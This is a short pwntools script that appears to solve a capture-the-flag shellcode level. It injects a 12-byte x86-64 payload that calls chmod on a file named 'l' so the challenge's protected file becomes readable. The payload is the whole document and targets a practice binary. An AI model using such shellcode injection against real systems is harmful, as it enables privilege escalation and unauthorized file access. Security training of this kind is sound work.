from pwn import *

context.update(arch="amd64", encoding="latin")

p = process("/challenge/babyshell_level13")

shellcode = f'''
.intel_syntax noprefix
.global _start

_start:
        push 0x6c
        mov rdi, rsp
        mov sil, 4
        mov al, 0x5a
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0xc bytes from stdin.")
p.write(shellcode)
print(p.readall().decode('utf-8'))
